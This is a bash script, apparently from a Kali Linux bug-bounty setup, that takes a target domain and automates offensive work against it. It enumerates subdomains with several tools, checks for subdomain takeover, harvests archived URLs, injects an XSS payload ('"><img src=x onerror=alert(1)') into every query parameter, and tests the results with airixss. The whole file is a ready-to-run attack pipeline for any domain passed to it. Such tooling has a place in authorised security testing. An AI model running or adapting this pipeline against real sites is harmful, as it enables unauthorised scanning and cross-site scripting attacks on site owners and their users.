#!/bin/bash

domain=$1

mkdir -p /home/kali/Desktop/$1

##Finding all subdomain (200,404,301 everything)
#bash /home/kali/SubDomz/SubDomz -d $1 -o /home/kali/Desktop/$1/All_Domians.txt
assetfinder -subs-only $1 | tee -a /home/kali/Desktop/$1/subdomain.txt
findomain -t $1 | tee -a /home/kali/Desktop/$1/subdomain.txt
subfinder -d $1 | tee -a /home/kali/Desktop/$1/subdomain.txt
python /home/kali/Desktop/Tools/Sublist3r/sublist3r.py -d $1 -o /home/kali/Desktop/$1/sublister.txt

#sorting to a sinle file
cat /home/kali/Desktop/$1/subdomain.txt /home/kali/Desktop/$1/sublister.txt | sort -u > /home/kali/Desktop/$1/All_subdomains.txt
#cat /home/kali/Desktop/$1domain/all_subdomains.txt | wc -l



###Sorting 200 only domians
cat /home/kali/Desktop/$1/All_subdomains.txt| httpx -match-code 200 | tee -a /home/kali/Desktop/$1/200_subdomains.txt

###Sorting 200 only domians
cat /home/kali/Desktop/$1/All_subdomains.txt| httpx -match-code 404 | tee -a /home/kali/Desktop/$1/404_subdomains.txt

###Subdomain Takeover
python3 /home/kali/Desktop/Tools/sub404/sub404.py -f /home/kali/Desktop/$1/404_subdomains.txt | tee -a /home/kali/Desktop/$1/takeoverPossible.txt

##Finding Parameters
cat /home/kali/Desktop/$1/200_subdomains.txt | waybackurls | tee -a /home/kali/Desktop/$1/endpoints.txt


#Replaceing with payload
cat /home/kali/Desktop/$1/endpoints.txt | qsreplace '"><img+src%3Dx+onerror%3Dalert(1)' | tee -a /home/kali/Desktop/$1/xss_fuzz.txt

#Gxxs
#cat /home/kali/Desktop/$1domain/$1_endpoints.txt | Gxss "<script>alert(1)</script>" | tee -a /home/kali/Desktop/$1domain/xss_fuzz.txt


#Testing XSS freq
#cat /home/kali/Desktop/$1domain/xss_fuzz.txt | freq | tee -a /home/kali/Desktop/$1domain/xss.txt

#Testing XSS airixss
#cat /home/kali/Desktop/$1domain/xss_fuzz.txt | freq | tee -a /home/kali/Desktop/$1domain/xss.txt

#Testing XSS airixss
cat /home/kali/Desktop/$1/xss_fuzz.txt | airixss -payload "confirm(1)" | tee -a /home/kali/Desktop/$1/xss.txt

#Dalfox
#cat dalfox url | tee -a /home/kali/Desktop/$1domain/xss.txt

cat /home/kali/Desktop/$1/xss.txt | egrep -v 'Not' | tee -a /home/kali/Desktop/$1/finalxss.txt

